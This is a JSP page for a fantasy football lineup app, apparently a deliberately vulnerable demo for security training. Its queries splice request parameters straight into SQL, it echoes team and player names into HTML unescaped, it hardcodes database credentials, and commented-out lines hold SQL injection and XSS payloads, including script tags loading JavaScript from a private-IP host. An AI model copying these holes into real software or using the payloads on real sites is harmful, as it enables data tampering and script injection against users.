<%@ page import="java.sql.*"%>

<html lang="en">

<head>
	<link rel="stylesheet" type="text/css" href="css/table.css">
	<link rel="icon" href="/fantasy/lineup/images/icons/favicon.ico" type="image/x-icon">
	<link rel="shortcut icon" href="/fantasy/lineup/images/icons/favicon.ico" type="image/x-icon"> 

</head>
<body>

<%
  String curTeamName = "";
  int curOwnPoints = 0;
  int curOpponentPoints = 0;
  String oppTeamName = "";
  String db = "techcon";
  String db_user = "mysql"; // assumes database name is the same as username
  ResultSet teamNameRs = null;
  ResultSet pointsRs = null;
  ResultSet oppPointsRs = null;
  ResultSet lineupRs = null;
  ResultSet oppTeamNameRs = null;
  java.sql.Connection con = null;
  String username = request.getUserPrincipal().getName();
  try {
    Class.forName("com.mysql.jdbc.Driver");
    con = DriverManager.getConnection("jdbc:mysql://localhost/"+db+"?useUnicode=true&useJDBCCompliantTimezoneShift=true&useLegacyDatetimeCode=false&serverTimezone=UTC", db_user, "mysql");
    //out.println (db+ " database successfully opened.");
    Statement statement = con.createStatement() ;
             //resultset = statement.executeQuery("select * from lineup") ; 
             String teamName = request.getParameter("teamName");
             String updateStr1 = "update team set teamName = '";
             String updateStr2 = "' where userName = '"+username+"'";
             //teamName = "hack', points='100";
             //teamName = "<img src=\"javascript:alert(''hello everybody'')\"></img>";
             //teamName = "<script src=\"https://192.168.4.100:9443/sample/gotcha.js\"></script>";
             //teamName = "<script src=\"http://192.168.4.100:9090/sample/test.js\"></script>";
             String updateStr = updateStr1 + teamName + updateStr2;

             if(teamName!=null){
	             statement.execute(updateStr);
    		 }
    		 String teamNameQuery = "select teamName from team where userName = '"+username+"'";
             teamNameRs = statement.executeQuery(teamNameQuery) ;
             teamNameRs.next(); 
             curTeamName = teamNameRs.getString(1);

    		 String pointsQuery = "select points from team where teamName = '"+curTeamName+"'";
             pointsRs = statement.executeQuery(pointsQuery) ;
             pointsRs.next(); 
             curOwnPoints = pointsRs.getInt(1);

    		 String oppTeamNameQuery = "select teamName from team where userName != '"+username+"'";
             oppTeamNameRs = statement.executeQuery(oppTeamNameQuery) ;
             oppTeamNameRs.next(); 
             oppTeamName = oppTeamNameRs.getString(1);

    		 String oppPointsQuery = "select points from team where teamName = '"+oppTeamName+"'";
             oppPointsRs = statement.executeQuery(oppPointsQuery) ;
             oppPointsRs.next(); 
             curOpponentPoints = oppPointsRs.getInt(1);

             String playerName = request.getParameter("player");
             String toggleQuery = "";
             if(playerName!=null){
             	toggleQuery = "update lineup set status = if(status='Starting','Bench', 'Starting') where playerName = '"+playerName+"' and userName = '"+username+"'";
             	statement.execute(toggleQuery);	
         	 }

			 String lineupQuery = "select * from lineup where userName = '"+username+"' order by id";
		     lineupRs = statement.executeQuery(lineupQuery) ;
%>

<!-- <script src="http://192.168.4.100:9090/sample/test.js"></script> -->
	<table border=0 class="user_header">
		<tr>
			<td>
				Welcome <span class="userName"><%=username%></span>!
			</td>
			<td>
	<form class="changeTeamName" method="post">
		<input onfocus="if(this.value == 'Change Team Name'){this.value = '';}" type="text" onblur="if(this.value == ''){this.value='Change Team Name';}" id="name" value="Change Team Name" name="teamName"/>
	</form>	
			</td>
		</tr>
	</table>


	<div class="banner"><img class="banner_center" src="../images/VHT_Header_Football.png"/></div>

<p>
	<table class="demo-table center">
		<thead>
			<tr>
				<th>Team Name</th>
				<th>Points</th>
				<th>Opponent Name</th>
				<th>Opponent Points</th>
			</tr>
		</thead>
		<tbody>
			<tr>
				<td>
					<span class="teamName"><%=curTeamName%></span>
				</td>
				<td><%=curOwnPoints%></td>
				<td><span class="teamName"><%=oppTeamName%></span></td>
				<td><%=curOpponentPoints%></td>
			</tr>
		</tbody>
	</table>
<p>
	<table id="lineupTable" class="demo-table center">
		<caption class="title">Week 4</caption>
		<thead>
			<tr class="row100 head">
				<th>Player</th>
				<th>Position</th>
				<th>Team</th>
				<th>Status</th>
				<th></th>
			</tr>
		</thead>
		<tbody>
			<%
				while(lineupRs.next()){
					String helmetImg = "images/helmets/"+lineupRs.getString(7);
			%>
			<tr class="row100 body">
				<td><%=lineupRs.getString(2)%></td>
				<td><%=lineupRs.getString(3)%></td>
				<td><img class="helmetLogo" src="<%=helmetImg%>"/></td>
				<td><%=lineupRs.getString(5)%></td>
				<td>
					<form class="statusChangeForm" method="post">
						<input type="hidden" name="player" value="<%=lineupRs.getString(2)%>"/>
						<input type=submit value="Change Status"/>
					</form>
			</tr>

<%
 	 }
%>
		</tbody>
	</table>
<p>
	<table class="demo-table center">
		<thead>
			<tr class="row100 head">
				<th><span class="mblink"><a href="messageboard.jsp">Message Board</a>&nbsp;(1)</span></th>
			</tr>
		</thead>
	</table>
	<%
  }
  catch(SQLException e) {
    out.println("SQLException caught: " +e.getMessage());
  }finally{
  	con.close();
  }

%>

</body>
</html>
